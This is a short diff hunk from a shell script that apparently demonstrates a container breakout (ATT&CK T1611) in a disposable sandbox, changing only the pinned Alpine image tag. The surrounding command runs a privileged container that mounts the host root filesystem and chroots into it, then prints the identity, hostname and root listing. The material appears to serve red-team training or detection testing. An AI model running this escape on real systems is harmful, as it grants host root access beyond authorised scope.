@@ -47,7 +47,7 @@ say "containers currently visible on this control plane:"
 docker ps -a 2>&1 | tee -a "$LOG"
 
 step "escape — spawn a privileged container with the daemon's host fs mounted (ATT&CK T1611)"
-OUT="$(docker run --rm --privileged -v /:/host alpine chroot /host sh -c \
+OUT="$(docker run --rm --privileged -v /:/host alpine:3.20 chroot /host sh -c \
     'echo "escaped: $(id)"; echo "escaped-hostname: $(hostname)"; echo "escaped-root-listing:"; ls /' 2>&1)"
 say "breakout result (this is docker-sandbox's own disposable root, not the real host):"
 echo "$OUT" | tee -a "$LOG"
